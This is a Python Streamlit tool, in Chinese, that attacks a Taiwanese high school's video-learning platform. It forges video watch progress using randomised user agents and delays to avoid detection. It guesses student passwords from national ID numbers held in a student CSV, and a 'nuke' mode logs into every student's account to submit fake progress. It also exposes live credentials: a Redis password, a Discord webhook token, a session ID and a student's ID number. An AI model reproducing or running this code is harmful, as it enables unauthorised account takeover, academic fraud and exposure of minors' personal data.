import streamlit as st
import requests
import time
import random
from urllib.parse import urlparse, parse_qs
import pandas as pd
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import redis
if "cancel_submit" not in st.session_state:
    st.session_state.cancel_submit = False
redis_client = redis.from_url(
    "redis://default:PNumDUKhKdLTkgLDqaQvGIENbXZOTLJT@yamanote.proxy.rlwy.net:37944",
    decode_responses=True
)
# === 配置 ===
DISCORD_WEBHOOK_URL = st.text_input("Discord Webhook 網址", value="https://discord.com/api/webhooks/1402211944743567440/7jRAZdnPJq8MzmHsmIERrShv253fG4toTBskp9BafOv4k9EAu0BHsbNMlxI3kB6PrLpc", type="password")

BASE_URL = "https://dmhs.teams.com.tw"
DASHBOARD_URL_TEMPLATE = f"{BASE_URL}/VideoProgress!dashboard?user={{user_id}}&showCompleted=true"
PROGRESS_URL = f"{BASE_URL}/VideoProgress!insertProgress"
DEFAULT_SESSION = st.text_input("預設 JSESSIONID", type="password") or "AF1B47245D695296E9CF45A2B7A36162"
DEFAULT_USER_ID = st.text_input("預設使用者 ID") or "D10028_STUDENT_003052"
USER_AGENTS = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
]

# === 載入學生資料 ===
@st.cache_data
def load_student_csv():
    try:
        return pd.read_csv("student.csv")
    except:
        return pd.DataFrame([{
            "sid": 1,
            "uid": 1130273,
            "sp": None,
            "class": "高一",
            "uname": "毛清偉",
            "classn": 1,
            "index": 2918,
            "upasswd": "E126581765",
            "classroom": "03A"
        }])

students_df = load_student_csv()

# === 認證 ===
def login():
    st.title("🔒 儀表板")
    with st.form("login"):
        username = st.text_input("使用者名稱")
        password = st.text_input("密碼", type="password")
        submitted = st.form_submit_button("登入")
        if submitted:
            if username == "ethan" and password == "ethan0503":
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("認證失敗")

if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    login()
    st.stop()

# === 狀態 ===
for key in ["videos_progressed", "links", "manual_links", "submitted_links", "top_videos", "top_students"]:
    if key not in st.session_state:
        st.session_state[key] = [] if key in ["links", "manual_links", "submitted_links", "top_videos", "top_students"] else 0

if "active_tab" not in st.session_state:
    st.session_state.active_tab = "manual"

# === 工具函數 ===
def create_session_with_retries():
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
    session.mount("https://", HTTPAdapter(max_retries=retries))
    return session

def send_discord_webhook(video_url, user_id):
    if not DISCORD_WEBHOOK_URL:
        return
    content = f"🎬 **影片進度已更新**\n🔗 {video_url}\n👤 使用者: {user_id}"
    data = {"content": content}
    try:
        resp = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
        if resp.status_code != 204:
            st.warning(f"⚠️ Discord Webhook 失敗: {resp.status_code}")
    except Exception as e:
        st.warning(f"⚠️ Webhook 異常: {e}")

def build_video_url(course, user, unit, task):
    return f"{BASE_URL}/student/cinemaVideo.html?course={course}&user={user}&id={unit}&task={task}"

def get_common_headers(video_url, session_id, user_id):
    return {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': video_url,
        'User-Agent': random.choice(USER_AGENTS),
        'Cookie': f"JSESSIONID={session_id}; userId={user_id};"
    }
# --- Changes in fetch_completed_videos ---
# Remove @st.cache_data to ensure fresh fetch each time
def fetch_completed_videos(user_id):
    url = DASHBOARD_URL_TEMPLATE.format(user_id=user_id)
    headers = {"X-Requested-With": "XMLHttpRequest"}
    cookies = {"userId": user_id}
    session = create_session_with_retries()

    for attempt in range(3):
        try:
            r = session.get(url, headers=headers, cookies=cookies, timeout=10)
            r.raise_for_status()
            data = r.json().get("result", [])
            if not data:
                return [], "🎉 無已完成影片"

            links = []
            for item in data:
                task = item.get("task", {})
                unit = item.get("unit", {})
                if not unit.get("video"):
                    continue
                course_id = task.get("course", "UNKNOWN_COURSE")
                unit_id = unit.get("_id", "UNKNOWN_UNIT")
                task_id = task.get("_id", "UNKNOWN_TASK")
                video_name = unit.get("title", unit.get("name", f"影片-{unit_id}"))
                video_id = f"{course_id}-{unit_id}-{task_id}"
                links.append({
                    "url": build_video_url(course_id, user_id, unit_id, task_id),
                    "video_id": video_id,
                    "video_name": video_name,
                    "course": course_id,
                    "unit_id": unit_id,
                    "task_id": task_id
                })
            return links, f"✅ 找到 {len(links)} 個影片"
        except requests.RequestException as e:
            if attempt == 2:
                return [], f"❌ 獲取異常: {e}"
            time.sleep(1)
    return [], "❌ 獲取失敗"
def login_and_get_user_id(account, password, session_id):
    session = create_session_with_retries()
    session.cookies.set("JSESSIONID", session_id, domain="dmhs.teams.com.tw")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(USER_AGENTS),
        "X-Requested-With": "XMLHttpRequest"
    }
    data = {"account": account, "password": password}
    login_url = f"{BASE_URL}/User/!login"
    try:
        resp = session.post(login_url, headers=headers, data=data, timeout=10)
        if resp.status_code == 200 and '"success":true' in resp.text:
            user_id = session.cookies.get("userId", DEFAULT_USER_ID)
            return user_id, None
        return None, f"❌ 登入失敗 ({resp.status_code}): {resp.text}"
    except Exception as e:
        return None, f"❌ 登入異常: {e}"
# --- Changes in submit_video_progress ---
def submit_video_progress(video_url, session_id, debug=False, use_webhook=True, min_delay=0.5, max_delay=1.5):
    if st.session_state.cancel_submit:
        return "🚫 已取消"

    parsed = urlparse(video_url)
    qs = parse_qs(parsed.query)
    course = qs.get('course', [None])[0]
    user = qs.get('user', [None])[0]
    unit = qs.get('id', [None])[0]
    task = qs.get('task', [None])[0]

    if not all([course, user, unit, task]):
        return f"[錯誤] URL 缺少參數: {video_url}"

    if video_url in st.session_state.submitted_links:
        return f"🔁 跳過重複: {video_url}"

    headers = get_common_headers(video_url, session_id, user)
    data = {
        'task': task,
        'unit': unit,
        'course': course,
        'user': user,
        'type': 'teams',
        'startScale': '0',
        'endScale': str(random.randint(96, 100)),
    }

    try:
        resp = requests.post(PROGRESS_URL, headers=headers, data=data, timeout=10)
        resp.raise_for_status()
        time.sleep(random.uniform(min_delay, max_delay))
        st.session_state.videos_progressed += 1
        st.session_state.submitted_links.append(video_url)
        redis_client.incr("video_count")
        if not redis_client.sismember("users_helped_set", user):
            redis_client.sadd("users_helped_set", user)
            redis_client.incr("user_helped")
        if use_webhook:
            send_discord_webhook(video_url, user)
        return f"✅ 已提交: {video_url}"
    except requests.RequestException as e:
        return f"❌ 提交失敗: {e}"
# === 統計熱門影片與學生 ===
@st.cache_data
def aggregate_top_videos_and_students(session_id):
    student_counts = {}
    progress_bar = st.progress(0)
    status_placeholder = st.empty()
    total_students = len(students_df)
    
    for idx, row in students_df.iterrows():
        uid = str(row["uid"])
        id_card = str(row["upasswd"])
        password = f"dm{id_card[-4:]}" if len(id_card) >= 4 else None
        if not password:
            continue
        
        status_placeholder.text(f"正在處理學生 {idx + 1}/{total_students}: {uid}")
        
        user_id, error = login_and_get_user_id(uid, password, session_id)
        if error:
            continue
        
        videos, msg = fetch_completed_videos(user_id)
        student_counts[uid] = {
            "uid": uid,
            "uname": row["uname"],
            "class": row["class"],
            "classroom": row["classroom"],
            "video_count": len(videos)
        }
        
        progress_bar.progress((idx + 1) / total_students)
        time.sleep(random.uniform(0.1, 0.3))
    
    progress_bar.empty()
    status_placeholder.empty()
    
    top_students = [
        {
            "uid": data["uid"],
            "uname": data["uname"],
            "class": data["class"],
            "classroom": data["classroom"],
            "video_count": data["video_count"]
        }
        for data in student_counts.values()
    ]
    top_students.sort(key=lambda x: x["video_count"], reverse=True)
    
    return [], top_students

# === 使用者介面 ===
st.set_page_config(page_title="sigma", layout="wide")
st.title("🎞️ sigma")

st.markdown("## 🔧 配置")
col1, col2 = st.columns(2)
session_id = col1.text_input("JSESSIONID", value=DEFAULT_SESSION, key="session_id")
user_id = col2.text_input("使用者 ID", value=st.session_state.get("fetched_user_id", DEFAULT_USER_ID), key="user_id")

st.markdown("## 🧩 模式選擇")
tabs = st.tabs(["📥 手動輸入", "🔍 自動獲取影片", "🎓 學生搜尋", "📊 超混學生", "☢️ 核彈"])

with tabs[0]:
    st.session_state.manual_links = st.text_area("貼上影片連結（每行一個）", value="\n".join(st.session_state.manual_links), height=200)
    if st.session_state.manual_links.strip():
        st.session_state.links = [line.strip() for line in st.session_state.manual_links.strip().splitlines()]
        st.success(f"✅ 已載入 {len(st.session_state.links)} 個手動連結")
# --- Changes in "獲取影片" button handler ---
with tabs[1]:
    if st.button("🔍 獲取影片"):
        st.session_state.links = []  # ✅ Clear old list first
        with st.spinner("正在獲取..."):
            links, msg = fetch_completed_videos(st.session_state.get("fetched_user_id", user_id))
            st.info(msg)
            if links:
                st.session_state.links = [v["url"] for v in links]
                st.session_state.active_tab = "fetch"
                st.success(f"🎬 成功獲取 {len(st.session_state.links)} 部影片")
                for i, video in enumerate(links, 1):
                    st.markdown(f"{i}. [`{video['video_name']} ({video['video_id']})`]({video['url']})")

st.markdown("---")
with st.expander("🛡️ 高級隱形設定", expanded=True):
    use_webhook = st.checkbox("📢 啟用 Discord Webhook", value=True, key="use_webhook")
    debug = st.checkbox("🪛 啟用除錯日誌", key="debug")

    col3, col4 = st.columns(2)
    min_delay = col3.slider("⏳ 最小延遲 (秒)", 0.1, 5.0, 0.5, 0.1)
    max_delay = col4.slider("⏳ 最大延遲 (秒)", 0.5, 10.0, 1.4, 0.1)

# === 提交區域 ===
if st.session_state.links:
    st.markdown("## 🚀 影片面板")
    st.info(f"🎬 總共載入影片數: **{len(st.session_state.links)}**")

    # 初始化取消標誌
    if "cancel_submit" not in st.session_state:
        st.session_state.cancel_submit = False

    # 🎯 提交多少影片？
    st.markdown("### 🎯 您想提交多少影片？")
    col_limit, col_reset = st.columns([3, 1])
    max_videos_to_submit = col_limit.number_input(
        "影片數量",
        min_value=1,
        max_value=len(st.session_state.links),
        value=min(5, len(st.session_state.links)),
        step=1
    )

    # ❌ 取消按鈕
    if col_reset.button("❌ 取消提交"):
        st.session_state.cancel_submit = True
        st.warning("⛔ 已請求取消，將在當前影片後停止。")

    # 🚀 全部提交按鈕
    st.markdown("### 🚀 開始提交")
    if st.button("🚀 立即提交全部"):
        if not session_id or not user_id:
            st.error("❗ 必須提供 Session ID 和使用者 ID。")
        else:
            st.session_state.cancel_submit = False
            with st.spinner("正在提交影片，請稍候..."):
                results = []
                progress_bar = st.progress(0)
                status_placeholder = st.empty()
                total = min(max_videos_to_submit, len(st.session_state.links))

                for i, link in enumerate(st.session_state.links[:total], 1):
                    if st.session_state.cancel_submit:
                        st.warning("🚫 使用者取消。")
                        break

                    status_placeholder.markdown(f"📡 正在提交 **{i}/{total}**: `{link}`")
                    msg = submit_video_progress(
                        video_url=link,
                        session_id=session_id,
                        debug=debug,
                        use_webhook=use_webhook,
                        min_delay=min_delay,
                        max_delay=max_delay
                    )
                    results.append(f"{i}. {msg}")
                    progress_bar.progress(i / total)

                st.session_state.cancel_submit = False
                progress_bar.empty()
                status_placeholder.empty()
                st.success("✅ 提交流程完成！")

                st.markdown("### 📋 提交結果")
                for r in results:
                    st.write(r)

    # === 下載影片連結 ===
    st.markdown("### 💾 下載影片連結")
    st.download_button(
        "💾 下載所有影片連結",
        data="\n".join(st.session_state.links),
        file_name="video_links.txt",
        mime="text/plain"
    )

with tabs[2]:
    st.subheader("🎓 學生資料條件查詢")
    column_mapping = {
        "學號 (UID)": "uid",
        "姓名 (Name)": "uname",
        "身分證 (ID)": "upasswd",
        "班級 (Classroom)": "classroom",
        "年級 (Grade)": "class",
    }
    st.markdown("### 🔎 查詢條件")
    col1, col2, col3 = st.columns(3)
    field1 = col1.selectbox("條件 1 欄位", list(column_mapping.keys()), key="f1")
    value1 = col1.text_input("條件 1 關鍵字", key="v1")
    field2 = col2.selectbox("條件 2 欄位", list(column_mapping.keys()), key="f2")
    value2 = col2.text_input("條件 2 關鍵字", key="v2")
    field3 = col3.selectbox("條件 3 欄位", list(column_mapping.keys()), key="f3")
    value3 = col3.text_input("條件 3 關鍵字", key="v3")
    if any([value1.strip(), value2.strip(), value3.strip()]):
        df_filtered = students_df.copy()
        for field_label, value in [(field1, value1), (field2, value2), (field3, value3)]:
            if value.strip():
                col_name = column_mapping[field_label]
                query = value.strip()
                if col_name == "class":
                    query = {"1": "高一", "2": "高二", "3": "高三"}.get(query, query)
                df_filtered = df_filtered[
                    df_filtered[col_name].astype(str).str.lower().str.contains(query.lower(), na=False)
                ]
        if df_filtered.empty:
            st.warning("❌ 無符合的資料")
        else:
            st.success(f"✅ 找到 {len(df_filtered)} 筆資料")
            for _, row in df_filtered.iterrows():
                uid = str(row["uid"])
                name = str(row["uname"])
                id_card = str(row["upasswd"])
                password = f"dm{id_card[-4:]}" if len(id_card) >= 4 else "❌ 身分證錯誤"
                with st.container():
                    st.markdown(f"**🧑‍🎓 學號**: `{uid}`")
                    st.markdown(f"**📛 姓名**: `{name}`")
                    st.markdown(f"**🪪 身分證**: `{id_card}`")
                    st.markdown(f"**🔐 預設密碼**: `{password}`")
                    colA, colB = st.columns(2)
                    colA.markdown("📋 複製帳號 (學號):")
                    colA.code(uid, language="text")
                    colB.markdown("📋 複製密碼 (dm後4碼):")
                    colB.code(password, language="text")
                    if st.button(f"📥 為 {uid} 獲取影片", key=f"fetch_{uid}"):
                        with st.spinner(f"正在為 {uid} 進行認證..."):
                            student_user_id, error = login_and_get_user_id(uid, password, session_id)
                            if error:
                                st.error(error)
                            else:
                                st.session_state.fetched_user_id = student_user_id
                                st.session_state.manual_links = ""
                                with st.spinner(f"正在為 {uid} 獲取影片..."):
                                    links, msg = fetch_completed_videos(student_user_id)
                                    st.session_state.links = [v["url"] for v in links]
                                    st.session_state.active_tab = "fetch"
                                    st.rerun()
                    st.markdown("---")
    else:
        st.info("請輸入至少一個查詢條件以開始搜尋")

with tabs[3]:
    st.subheader("📊 按影片數量排序的超混學生")
    if st.button("🔎 分析超混學生"):
        with st.spinner("正在分析學生..."):
            _, st.session_state.top_students = aggregate_top_videos_and_students(session_id)
    
    if st.session_state.top_students:
        st.markdown("### 📋 影片數量排序的超混學生")
        df_top_students = pd.DataFrame(st.session_state.top_students)
        df_top_students.insert(0, "排名", range(1, len(df_top_students) + 1))
        st.dataframe(
            df_top_students[["排名", "uid", "uname", "class", "classroom", "video_count"]].rename(
                columns={
                    "uid": "學號",
                    "uname": "姓名",
                    "class": "年級",
                    "classroom": "班級",
                    "video_count": "影片數量"
                }
            ),
            use_container_width=True
        )
        csv_students = df_top_students.to_csv(index=False)
        st.download_button("💾 下載熱門學生資料", data=csv_students, file_name="top_students.csv")
        
        top_5_students = df_top_students.head(5)
        if not top_5_students.empty:
            st.markdown("### 📊 前五名超混學生影片數量排序")
            st.json({
                "type": "bar",
                "data": {
                    "labels": [f"{row['uname']} ({row['uid']})" for _, row in top_5_students.iterrows()],
                    "datasets": [{
                        "label": "影片數量",
                        "data": [row["video_count"] for _, row in top_5_students.iterrows()],
                        "backgroundColor": ["#36A2EB", "#FF6384", "#FFCE56", "#4BC0C0", "#9966FF"],
                        "borderColor": ["#2A8BBF", "#D9546F", "#D9A63E", "#3B9C9C", "#7A52CC"],
                        "borderWidth": 1
                    }]
                },
                "options": {
                    "scales": {
                        "y": {
                            "beginAtZero": True,
                            "title": {"display": True, "text": "影片數量"}
                        },
                        "x": {
                            "title": {"display": True, "text": "學生"}
                        }
                    },
                    "plugins": {
                        "legend": {"display": False},
                        "tooltip": {"enabled": True}
                    }
                }
            })
with tabs[4]:
    st.subheader("☢️ 核彈模式：為每位學生看影片")
    st.markdown("---")
    st.markdown("### ⚠️ 警告")
    st.error("此模式將**自動登入每位學生**，獲取影片並提交所有進度。")
    st.warning("如果被抓到可能被幹死")

    col1, col2 = st.columns([2, 1])
    step1 = col1.checkbox("✅ 我了解風險")
    step2 = col2.button("🚨 啟動全面提交")

    confirm_final = st.checkbox("🔓 我確認並開始全面提交")
    nuke_ready = step1 and step2 and confirm_final

    if nuke_ready:
        st.success("💣 核彈已啟動。正在開始提交...")

        progress_bar = st.progress(0)
        status_placeholder = st.empty()
        results_per_student = []
        total_students = len(students_df)

        for idx, row in students_df.iterrows():
            uid = str(row["uid"])
            name = str(row["uname"])
            id_card = str(row["upasswd"])
            password = f"dm{id_card[-4:]}" if len(id_card) >= 4 else None
            if not password:
                continue

            status_placeholder.markdown(f"📡 正在登入並處理 `{uid}` - `{name}`")

            user_id, error = login_and_get_user_id(uid, password, session_id)
            if error or not user_id:
                results_per_student.append({
                    "uid": uid,
                    "name": name,
                    "status": f"❌ 登入失敗: {error}"
                })
                continue

            videos, msg = fetch_completed_videos(user_id)
            if not videos:
                results_per_student.append({
                    "uid": uid,
                    "name": name,
                    "status": f"📭 無影片"
                })
                continue

            student_result = []
            for i, video in enumerate(videos):
                link = video["url"]
                try:
                    result = submit_video_progress(link, session_id, debug, use_webhook, min_delay, max_delay)
                    student_result.append(result)
                except Exception as e:
                    student_result.append(f"⚠️ 錯誤: {e}")
                time.sleep(random.uniform(0.3, 0.7))

            # === Redis 更新 ===
            r.incrby("video_count", len(videos))
            if not r.sismember("users_helped_set", uid):
                r.sadd("users_helped_set", uid)
                r.incr("user_helped")

            results_per_student.append({
                "uid": uid,
                "name": name,
                "status": f"✅ 已提交 {len(student_result)} 個影片",
                "details": student_result
            })

            progress_bar.progress((idx + 1) / total_students)

        progress_bar.empty()
        status_placeholder.empty()
        st.success("✅ 所有學生已完成。")

        st.markdown("### 📋 核彈結果")
        for student in results_per_student:
            with st.expander(f"{student['uid']} - {student['name']}: {student['status']}", expanded=False):
                for line in student.get("details", []):
                    st.write(line)

        download_lines = [
            f"{s['uid']} - {s['name']}: {s['status']}" + "\n" + "\n".join(s.get("details", []))
            for s in results_per_student
        ]
        st.download_button("💾 下載全面提交日誌", "\n\n".join(download_lines), "nuke_log.txt")

    else:
        st.info("🔒 等待完全確認以解鎖核彈模式。")

st.markdown("---")
st.markdown("---")
st.metric("🌍 影片數", redis_client.get("video_count") or 0)
st.metric("🌍 幫助人數", redis_client.get("user_helped") or 0)
